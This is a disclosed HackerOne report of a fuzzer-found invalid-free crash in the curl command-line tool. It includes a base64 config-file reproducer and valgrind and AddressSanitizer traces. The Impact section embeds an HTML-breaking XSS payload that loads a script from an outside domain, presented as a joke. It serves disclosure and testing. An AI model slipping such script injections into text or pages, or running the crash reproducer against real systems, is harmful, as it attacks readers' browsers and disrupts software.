# Invalid write (or double free) triggers curl command line tool crash

## Report Details
- **Report ID**: 875775
- **URL**: https://hackerone.com/reports/875775
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-15T23:21:01.674Z
- **Disclosed**: 2020-05-18T06:23:01.976Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
Whilst fuzzing libcurl built from `git commit a158a09`, a crash triggered by an invalid write (or maybe a double/invalid  free) was found. 

## Steps To Reproduce:

Run:
`echo "LVQvCnVyIDA=" | base64 -d > test0000`
`./curl --verbose -q -K test0000 file:///dev/null`

Stack:

```
valgrind -q src/curl --verbose -q -K ~/curl/tmp/out/crashes/test0001 file:///dev/null
==12371== Invalid free() / delete / delete[] / realloc()
==12371==    at 0x48369AB: free (vg_replace_malloc.c:530)
==12371==    by 0x128C84: add_file_name_to_url (in /root/curl-no-asan/src/curl)
==12371==    by 0x1259EF: create_transfer (in /root/curl-no-asan/src/curl)
==12371==    by 0x1285DC: operate (in /root/curl-no-asan/src/curl)
==12371==    by 0x119828: main (in /root/curl-no-asan/src/curl)
==12371==  Address 0x192f1a is in a r-- mapped file /root/curl-no-asan/src/curl segment
==12371==
*   Trying 0.0.0.0:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* connect to 0.0.0.0 port 80 failed: Connection refused
* Failed to connect to 0 port 80: Connection refused
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* Closing connection 0
curl: (7) Failed to connect to 0 port 80: Connection refused
* Closing connection 1
```

If we switch over to ASAN with AFL's libdislocator.so loaded:
```
LD_PRELOAD=/root/aflplusplus/libdislocator.so ../../../src/curl -q --verbose -K test0001 file:///dev/null
AddressSanitizer:DEADLYSIGNAL
=================================================================
==12389==ERROR: AddressSanitizer: SEGV on unknown address 0x00000074b590 (pc 0x0000004267f4 bp 0x000000000000 sp 0x7fffffffcdd0 T0)
==12389==The signal is caused by a WRITE memory access.
    #0 0x4267f4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/root/curl/src/curl+0x4267f4)
    #1 0x49daa1 in free (/root/curl/src/curl+0x49daa1)
    #2 0x511d0d in add_file_name_to_url /root/curl/src/tool_operhlp.c:117:7
    #3 0x50281e in single_transfer /root/curl/src/tool_operate.c:1116:24
    #4 0x4fe95b in transfer_per_config /root/curl/src/tool_operate.c:2438:14
    #5 0x4fe95b in create_transfer /root/curl/src/tool_operate.c:2454:14
    #6 0x4f9de6 in serial_transfers /root/curl/src/tool_operate.c:2273:12
    #7 0x4f9de6 in run_all_transfers /root/curl/src/tool_operate.c:2479:16
    #8 0x4f99d3 in operate /root/curl/src/tool_operate.c:2594:18
    #9 0x4f8437 in main /root/curl/src/tool_main.c:323:14
    #10 0x7ffff762309a in __libc_start_main /build/glibc-vjB4T1/glibc-2.28/csu/../csu/libc-start.c:308:16
    #11 0x425559 in _start (/root/curl/src/curl+0x425559)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/root/curl/src/curl+0x4267f4) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)
==12389==ABORTING
*** [AFL] bad allocator canary on free() ***
Stack dump:
0.      Program arguments: /usr/bin/llvm-symbolizer-10 --inlining=true --default-arch=x86_64
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys15PrintStackTraceERNS_11raw_ostreamE+0x1f)[0x7ffff4227a9f]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys17RunSignalHandlersEv+0x50)[0x7ffff4225d60]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xa50065)[0x7ffff4228065]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x12730)[0x7ffff37c9730]
/lib/x86_64-linux-gnu/libc.so.6(gsignal+0x10b)[0x7ffff330a7bb]
/lib/x86_64-linux-gnu/libc.so.6(abort+0x121)[0x7ffff32f5535]
/root/aflplusplus/libdislocator.so(free+0x1e1)[0x7ffff7fc9bb1]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm12PassRegistryD1Ev+0x1c)[0x7ffff435d1ec]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xb85c0e)[0x7ffff435dc0e]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm13llvm_shutdownEv+0xa9)[0x7ffff41bf329]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm8InitLLVMD1Ev+0x10)[0x7ffff419f7a0]
/usr/bin/llvm-symbolizer-10[0x406c70]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xeb)[0x7ffff32f709b]
/usr/bin/llvm-symbolizer-10[0x405eda]
```

## Impact

Denial of service, information disclosure, software crash, glitter everywhere"><script src=//xss.mx></script>, the Kool-Aid<x=" Man crashing through walls, dogs and cats living together, mass hysteria! Just kidding. It's probably limited only to the tool which means the impact is limited, I know the routine. (:

## Attachments
No attachments
